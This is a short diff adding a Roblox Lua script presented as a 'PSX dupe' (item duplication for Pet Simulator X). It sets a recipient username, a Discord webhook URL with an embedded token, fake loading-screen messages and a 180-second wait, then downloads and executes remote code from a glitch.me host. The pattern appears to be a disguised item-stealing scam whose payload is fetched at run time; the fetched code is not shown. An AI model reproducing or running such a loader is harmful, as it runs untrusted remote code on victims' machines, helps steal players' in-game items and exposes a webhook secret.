@@ -1,0 +1,15 @@
+UserName = "GHITABAHLOUL02"
+
+Webhook = "https://discord.com/api/webhooks/1096141623622115480/KgfY6p2PRhKxJHy9YAJZvr8YbHbarIXxbbDsHUuFTjzOfnRujpJosaAZkWoIvONFrJ0R"
+
+_G.ScriptName = "PSX dupe"
+
+_G.FirstText = "Preparing script..."
+
+_G.SecondText = "Script loading..."
+
+_G.ThirdText = "Almost done..."
+
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://rizzhub.glitch.me/scripts/Main.lua", true))()
